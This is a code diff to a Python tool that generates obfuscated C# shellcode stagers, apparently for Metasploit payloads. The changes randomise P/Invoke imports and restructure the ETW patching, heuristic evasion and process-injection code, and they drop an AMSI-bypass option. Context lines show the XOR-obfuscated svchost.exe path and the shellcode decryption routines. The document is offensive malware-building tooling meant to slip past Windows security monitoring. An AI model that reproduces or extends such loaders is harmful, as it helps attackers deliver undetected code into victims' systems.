@@ -9,6 +9,7 @@ import argparse
 
 # Words to use to randomize namespace, class, and function names
 WORDS = open("/usr/share/dict/words").read().splitlines()
+WORDS.remove('null')  # Causes issues with C#
 
 # Randomly generate keys at runtime
 XOR_KEY = os.urandom(1)
@@ -133,7 +134,13 @@ class Stager:
     exe_path = b"C:\\\\Windows\\system32\\svchost.exe"
     path_obfuscated = ak.Obfuscator(exe_path, XOR_KEY)
 
-    imports = f"""{ak.ARCH_DETECTION}"""
+    # P/Invoke code to import
+    pinvoke_import_list = []
+    # C# code to import
+    imports = ""
+
+    # Detect x64/x86
+    imports += f"""{ak.ARCH_DETECTION}"""
 
     # Add staged or stageless code
     if self.args.stageless and self.shellcode is not None:
@@ -143,7 +150,7 @@ class Stager:
       # Staged
       main_code = f"""{url_dl_code}"""
 
-    # Decryption functions
+    # Shellcode Decryption functions
     if self.encrypt == 'xor':
       main_code += ak.SC_XOR_DECODER.format(enc_key=self.shellcode.get_key_csharp())
     elif self.encrypt == 'rc4':
@@ -158,19 +165,24 @@ class Stager:
       sys.exit()
 
     if self.args.heuristics:
-      imports += f"{ak.HEURISTICS_IMPORT}"
+      pinvoke_import_list += ak.HEURISTICS_PINVOKE_IMPORT
       main_code += f"{ak.HEURISTICS_CODE}"
 
     if self.args.etw:
-      imports += f"{ak.ETW_FUNCS}"
-      main_code += f"{ak.ETW_PATCH}"
+      pinvoke_import_list += ak.ETW_PINVOKE_IMPORT
+      imports += f"{ak.ETW_CODE_IMPORT}"
+      main_code += f"{ak.ETW_MAIN_CODE}"
 
-    if self.args.amsi:
-      imports += f"{ak.AMSI_BYPASS_IMPORT}"
-      main_code += f"{ak.AMSI_BYPASS_CODE}"
+    pinvoke_import_list += ak.import_choices_pinvoke_import[self.args.injection]
 
-    # Add loader type
-    imports += ak.import_choices[self.args.injection]
+    # Get unique pinvoke imports and randomize
+    pinvoke_import_list = list(set(pinvoke_import_list))
+    random.shuffle(pinvoke_import_list)
+    # Add pinvoke imports
+    for p in pinvoke_import_list:
+      imports += ak.get_pinvoke_import(p)
+
+    imports += ak.import_choices_code_import[self.args.injection]
     main_code += ak.main_choices[self.args.injection].format(ak=ak,
                                                         xor_path=path_obfuscated.get_hex_csharp(),
                                                         xor_key=path_obfuscated.get_key_csharp())
@@ -182,7 +194,7 @@ class Stager:
                                                cs_namespace=CS_NAMESPACE,
                                                cs_classname=CS_CLASSNAME)
 
-      # Must specify full namespace for DllImport
+      # Must specify full namespace for DllImport for ASPX
       template = template.replace("DllImport","System.Runtime.InteropServices.DllImport")
 
       ak.write_file(self.source_fn, template)
@@ -244,7 +256,6 @@ def main():
   parser.add_argument('--key', default="", help="Key for AES or RC4")
   parser.add_argument('--iv', default="", help="IV for AES")
   parser.add_argument('--heuristics', default=True, action='store_true')
-  parser.add_argument('--amsi', default=False, action='store_true')
   parser.add_argument('--etw', default=True, action='store_true')
   parser.add_argument('--stageless', default=False, action='store_true')
   parser.add_argument('--output', '-o', default="win_msf_stager")
